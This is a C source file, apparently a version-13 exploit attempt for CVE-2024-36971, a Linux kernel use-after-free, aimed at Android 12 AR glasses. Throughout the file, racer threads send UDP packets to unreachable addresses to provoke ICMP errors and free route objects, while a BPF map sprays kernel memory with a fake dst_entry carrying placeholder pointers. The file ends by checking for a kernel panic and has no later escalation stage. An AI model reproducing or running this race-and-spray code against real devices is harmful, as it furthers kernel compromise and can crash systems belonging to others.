/*
 * cve_2024_36971_v13.c
 * CVE-2024-36971 Exploit: Real Network ICMP Unreachable Trigger
 *
 * Target: Android 12 / Linux 5.10.209 (Rokid AR Glasses)
 * Arch: AArch64
 *
 * KEY IMPROVEMENT: Use REAL external IPs via wlan0 to trigger ICMP errors
 *
 * Previous versions (v9-v12) failed because:
 * - dummy0/loopback interfaces never set dst->obsolete
 * - Need real ICMP Destination Unreachable to trigger ipv4_negative_advice()
 *
 * Now with WiFi connected (wlan0 @ 192.168.1.110):
 * - Send UDP to unreachable external IPs (e.g., 1.2.3.4, 198.51.100.1)
 * - Router returns ICMP Destination Unreachable
 * - This triggers dst_entry obsolete state -> potential UAF
 *
 * Compile: aarch64-linux-android31-clang -static -O2 -pthread -o cve_36971_v13 cve_2024_36971_v13.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <signal.h>
#include <stdint.h>
#include <time.h>
#include <linux/types.h>
#include <sched.h>

#ifndef __NR_bpf
#define __NR_bpf 280
#endif

#define BPF_MAP_CREATE 0
#define BPF_MAP_UPDATE_ELEM 2
#define BPF_MAP_DELETE_ELEM 3
#define BPF_MAP_TYPE_HASH 1
#define BPF_ANY 0

union bpf_attr
{
    struct
    {
        __u32 map_type;
        __u32 key_size;
        __u32 value_size;
        __u32 max_entries;
        __u32 map_flags;
        __u32 inner_map_fd;
        __u32 numa_node;
        char map_name[16];
        __u32 map_ifindex;
        __u32 btf_fd;
        __u32 btf_key_type_id;
        __u32 btf_value_type_id;
    };
    struct
    {
        __u32 map_fd;
        __aligned_u64 key;
        union
        {
            __aligned_u64 value;
            __aligned_u64 next_key;
        };
        __u64 flags;
    };
};

static int bpf_syscall(int cmd, union bpf_attr *attr, unsigned int size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}

// Configuration - targeting ip_dst_cache (dst_entry ~200 bytes -> kmalloc-256)
#define SPRAY_SIZE 256
#define SPRAY_COUNT 4096
#define BATCH_SIZE 128
#define RACE_TIME 120
#define NUM_RACER_THREADS 4

// Unreachable external IPs - will generate ICMP Dest Unreachable
static const char *UNREACHABLE_IPS[] = {
    "1.2.3.4",        // Random unreachable
    "198.51.100.1",   // TEST-NET-2 (RFC 5737)
    "203.0.113.1",    // TEST-NET-3
    "192.0.2.1",      // TEST-NET-1
    "10.255.255.1",   // Private (likely no route)
    "172.31.255.254", // Private
    "192.168.99.99",  // Private (different subnet)
    "100.64.0.1",     // Carrier-grade NAT range
};
#define NUM_UNREACHABLE_IPS 8

volatile int stop = 0;
int bpf_map_fd = -1;
volatile uint64_t counter_trigger = 0;
volatile uint64_t counter_spray = 0;
volatile uint64_t counter_icmp_sent = 0;
volatile uint64_t counter_errors = 0;

void pin_to_cpu(int cpu_id)
{
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu_id, &cpuset);
    sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);
}

void prepare_payload(char *payload)
{
    memset(payload, 0x41, SPRAY_SIZE);

    // dst_entry offsets for arm64 (approximate)
    *(uint32_t *)(payload + 0) = 0xffff;                // refcnt
    *(uint64_t *)(payload + 8) = 0xdeadbeefcafebabeULL; // dst->ops (CRITICAL)
    *(uint64_t *)(payload + 0x10) = 0x4141414141414141ULL;
    *(uint64_t *)(payload + 0x38) = 0xbeefdead00000000ULL; // dst->dev
}

void *thread_spray(void *arg)
{
    union bpf_attr attr;
    char payload[SPRAY_SIZE];
    int keys[BATCH_SIZE];

    prepare_payload(payload);
    pin_to_cpu(0);

    printf("[Spray] Pinned to CPU 0, Object Size: %d bytes\n", SPRAY_SIZE);

    // Pre-fill map
    for (int i = 0; i < SPRAY_COUNT; i++)
    {
        int key = i;
        memset(&attr, 0, sizeof(attr));
        attr.map_fd = bpf_map_fd;
        attr.key = (unsigned long)&key;
        attr.value = (unsigned long)payload;
        attr.flags = BPF_ANY;
        bpf_syscall(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
    }
    printf("[Spray] Pre-filled %d entries\n", SPRAY_COUNT);

    while (!stop)
    {
        for (int k = 0; k < BATCH_SIZE; k++)
        {
            keys[k] = rand() % SPRAY_COUNT;
        }

        // DELETE - create holes
        for (int i = 0; i < BATCH_SIZE; i++)
        {
            memset(&attr, 0, sizeof(attr));
            attr.map_fd = bpf_map_fd;
            attr.key = (unsigned long)&keys[i];
            bpf_syscall(BPF_MAP_DELETE_ELEM, &attr, sizeof(attr));
        }

        sched_yield();

        // REFILL - try to overwrite freed dst_entry
        for (int i = 0; i < BATCH_SIZE; i++)
        {
            memset(&attr, 0, sizeof(attr));
            attr.map_fd = bpf_map_fd;
            attr.key = (unsigned long)&keys[i];
            attr.value = (unsigned long)payload;
            attr.flags = BPF_ANY;
            bpf_syscall(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
            __sync_fetch_and_add(&counter_spray, 1);
        }

        usleep(5);
    }
    return NULL;
}

/*
 * KEY: This racer uses REAL external IPs via wlan0
 * 1. connect() to external IP -> allocates dst_entry via ip_route_output_flow()
 * 2. send() UDP packet -> uses the dst_entry
 * 3. Router returns ICMP Dest Unreachable
 * 4. Kernel calls ipv4_negative_advice() -> sets dst->obsolete
 * 5. disconnect() -> releases dst_entry while possibly still referenced
 */
void *thread_racer(void *arg)
{
    int id = *(int *)arg;
    int fd;
    struct sockaddr_in addr_connect, addr_unspec;
    char buf[64] = "CVE-2024-36971-TRIGGER-ICMP-PKT";
    int ip_idx = 0;

    pin_to_cpu(0);

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0)
    {
        perror("socket");
        return NULL;
    }

    int flags = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, flags | O_NONBLOCK);

    // Enable ICMP error reporting
    int val = 1;
    setsockopt(fd, SOL_IP, IP_RECVERR, &val, sizeof(val));

    memset(&addr_unspec, 0, sizeof(addr_unspec));
    addr_unspec.sin_family = AF_UNSPEC;

    printf("[Racer %d] Started with %d external IPs\n", id, NUM_UNREACHABLE_IPS);

    while (!stop)
    {
        const char *target_ip = UNREACHABLE_IPS[ip_idx % NUM_UNREACHABLE_IPS];
        ip_idx++;

        memset(&addr_connect, 0, sizeof(addr_connect));
        addr_connect.sin_family = AF_INET;
        addr_connect.sin_port = htons(33333 + (id * 1000) + (ip_idx % 1000));
        addr_connect.sin_addr.s_addr = inet_addr(target_ip);

        // 1. CONNECT - Allocates dst_entry
        if (connect(fd, (struct sockaddr *)&addr_connect, sizeof(addr_connect)) == 0 ||
            errno == EINPROGRESS)
        {

            // 2. SEND - Triggers packet and ICMP error
            ssize_t sent = send(fd, buf, sizeof(buf), MSG_NOSIGNAL);
            if (sent > 0)
            {
                __sync_fetch_and_add(&counter_icmp_sent, 1);
            }

            // 3. Wait for ICMP error to be processed
            usleep(100); // Give time for ICMP to arrive

            // 4. Process error queue (triggers dst_entry state change)
            char errbuf[256];
            struct sockaddr_in erraddr;
            socklen_t errlen = sizeof(erraddr);
            int err = recvfrom(fd, errbuf, sizeof(errbuf), MSG_ERRQUEUE,
                               (struct sockaddr *)&erraddr, &errlen);
            if (err > 0 || errno == EAGAIN)
            {
                __sync_fetch_and_add(&counter_errors, 1);
            }

            // 5. DISCONNECT - Releases dst_entry (race window!)
            connect(fd, (struct sockaddr *)&addr_unspec, sizeof(addr_unspec));
        }

        __sync_fetch_and_add(&counter_trigger, 1);

        if (counter_trigger % 500 == 0)
        {
            sched_yield();
        }
    }

    close(fd);
    return NULL;
}

// Rapid reconnect strategy
void *thread_rapid_reconnect(void *arg)
{
    int fd;
    struct sockaddr_in addr1, addr2, addr_unspec;
    char buf[32] = "RAPID-ICMP";

    pin_to_cpu(1);

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0)
        return NULL;

    fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);

    int val = 1;
    setsockopt(fd, SOL_IP, IP_RECVERR, &val, sizeof(val));

    addr1.sin_family = AF_INET;
    addr1.sin_port = htons(44444);
    addr1.sin_addr.s_addr = inet_addr("1.2.3.4");

    addr2.sin_family = AF_INET;
    addr2.sin_port = htons(44445);
    addr2.sin_addr.s_addr = inet_addr("198.51.100.1");

    addr_unspec.sin_family = AF_UNSPEC;

    while (!stop)
    {
        connect(fd, (struct sockaddr *)&addr1, sizeof(addr1));
        send(fd, buf, sizeof(buf), MSG_NOSIGNAL);
        usleep(50);

        connect(fd, (struct sockaddr *)&addr2, sizeof(addr2));
        send(fd, buf, sizeof(buf), MSG_NOSIGNAL);
        usleep(50);

        connect(fd, (struct sockaddr *)&addr_unspec, sizeof(addr_unspec));

        __sync_fetch_and_add(&counter_trigger, 1);
    }

    close(fd);
    return NULL;
}

void *thread_monitor(void *arg)
{
    time_t start = time(NULL);
    uint64_t last_trigger = 0;

    while (!stop)
    {
        uint64_t curr_trigger = counter_trigger;

        printf("\r[%3lds] Triggers: %8lu (+%lu/s) | Sprays: %8lu | ICMP: %lu | Errs: %lu  ",
               time(NULL) - start,
               curr_trigger, curr_trigger - last_trigger,
               counter_spray,
               counter_icmp_sent,
               counter_errors);
        fflush(stdout);

        last_trigger = curr_trigger;
        sleep(1);
    }
    return NULL;
}

void sigint_handler(int sig) { stop = 1; }

int main(int argc, char **argv)
{
    int race_time = RACE_TIME;
    if (argc > 1)
        race_time = atoi(argv[1]);

    printf("=====================================================\n");
    printf(" CVE-2024-36971 v13 - Real Network ICMP Trigger\n");
    printf("=====================================================\n");
    printf("[*] Using wlan0 with external IPs for ICMP errors\n");
    printf("[*] Target: kmalloc-256 (dst_entry)\n");
    printf("[*] Race Time: %d seconds\n", race_time);
    printf("=====================================================\n\n");

    signal(SIGINT, sigint_handler);

    // Verify network
    printf("[*] Testing network...\n");
    int test_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (test_fd < 0)
    {
        printf("[-] Cannot create socket: %s\n", strerror(errno));
        return 1;
    }

    struct sockaddr_in test_addr;
    test_addr.sin_family = AF_INET;
    test_addr.sin_port = htons(12345);
    test_addr.sin_addr.s_addr = inet_addr("8.8.8.8");

    if (connect(test_fd, (struct sockaddr *)&test_addr, sizeof(test_addr)) == 0)
    {
        printf("[+] Network routing OK (can route to 8.8.8.8)\n");
    }
    else
    {
        printf("[!] Warning: Cannot route to 8.8.8.8: %s\n", strerror(errno));
    }
    close(test_fd);

    // Create BPF Map
    union bpf_attr attr = {0};
    attr.map_type = BPF_MAP_TYPE_HASH;
    attr.key_size = sizeof(int);
    attr.value_size = SPRAY_SIZE;
    attr.max_entries = SPRAY_COUNT;
    strncpy(attr.map_name, "dst_spray", 10);

    bpf_map_fd = bpf_syscall(BPF_MAP_CREATE, &attr, sizeof(attr));
    if (bpf_map_fd < 0)
    {
        printf("[-] BPF Map Create failed: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] BPF Map Created (fd=%d)\n", bpf_map_fd);

    pthread_t th_spray, th_monitor, th_rapid;
    pthread_t th_racers[NUM_RACER_THREADS];
    int ids[NUM_RACER_THREADS];

    printf("[*] Starting threads...\n");

    pthread_create(&th_monitor, NULL, thread_monitor, NULL);
    pthread_create(&th_spray, NULL, thread_spray, NULL);
    pthread_create(&th_rapid, NULL, thread_rapid_reconnect, NULL);

    for (int i = 0; i < NUM_RACER_THREADS; i++)
    {
        ids[i] = i;
        pthread_create(&th_racers[i], NULL, thread_racer, &ids[i]);
    }

    printf("[*] Running for %d seconds...\n\n", race_time);

    sleep(race_time);
    stop = 1;

    for (int i = 0; i < NUM_RACER_THREADS; i++)
        pthread_join(th_racers[i], NULL);
    pthread_join(th_rapid, NULL);
    pthread_join(th_spray, NULL);
    pthread_join(th_monitor, NULL);

    printf("\n\n[*] Test completed.\n");
    printf("[*] Total Triggers: %lu\n", counter_trigger);
    printf("[*] Total Sprays: %lu\n", counter_spray);
    printf("[*] ICMP Sent: %lu\n", counter_icmp_sent);
    printf("[*] Errors Processed: %lu\n", counter_errors);
    printf("[*] Check dmesg for 'deadbeef' or kernel panic.\n");

    close(bpf_map_fd);
    return 0;
}
